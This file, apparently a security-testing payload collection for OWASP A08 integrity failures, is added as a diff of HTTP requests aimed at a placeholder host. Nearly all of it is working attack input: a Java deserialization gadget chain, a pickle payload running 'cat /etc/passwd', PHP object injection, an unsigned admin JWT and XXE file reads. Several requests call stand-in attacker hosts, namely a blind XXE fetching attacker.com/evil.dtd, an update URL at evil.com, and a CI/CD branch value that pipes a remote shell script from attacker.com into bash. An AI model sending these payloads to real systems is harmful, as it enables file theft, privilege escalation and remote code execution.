@@ -1,0 +1,90 @@
+# OWASP Top 10 - A08:2021 Software and Data Integrity Failures
+# Intégrité logicielle et données
+
+### Insecure Deserialization - Java
+POST /api/process HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-java-serialized-object
+Content-Length: 150
+
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y
+
+### Insecure Deserialization - Python Pickle
+POST /api/load HTTP/1.1
+Host: {{host}}
+Content-Type: application/python-pickle
+Content-Length: 50
+
+cos
+system
+(S'cat /etc/passwd'
+tR.
+
+### Insecure Deserialization - PHP
+POST /api/unserialize HTTP/1.1
+Host: {{host}}
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+
+data=O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}
+
+### Unsigned JWT Modification
+GET /api/admin HTTP/1.1
+Host: {{host}}
+Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.
+
+### XML External Entity (XXE)
+POST /api/xml HTTP/1.1
+Host: {{host}}
+Content-Type: application/xml
+Content-Length: 150
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<user><name>&xxe;</name></user>
+
+### XXE - Blind OOB
+POST /api/xml HTTP/1.1
+Host: {{host}}
+Content-Type: application/xml
+Content-Length: 200
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
+<user><name>test</name></user>
+
+### Supply Chain Attack - Malicious Package
+POST /api/install HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 45
+
+{"package": "malicious-package", "version": "1.0.0"}
+
+### Code Injection via Update
+POST /api/update HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 60
+
+{"version": "1.0.0", "update_url": "http://evil.com/malware"}
+
+### Unsigned Firmware Upload
+POST /api/firmware/upload HTTP/1.1
+Host: {{host}}
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+Content-Length: 100
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="firmware"; filename="backdoor.bin"
+
+[BINARY_DATA]
+------WebKitFormBoundary--
+
+### CI/CD Pipeline Injection
+POST /api/deploy HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 80
+
+{"branch": "main; curl http://attacker.com/shell.sh | bash", "env": "prod"}
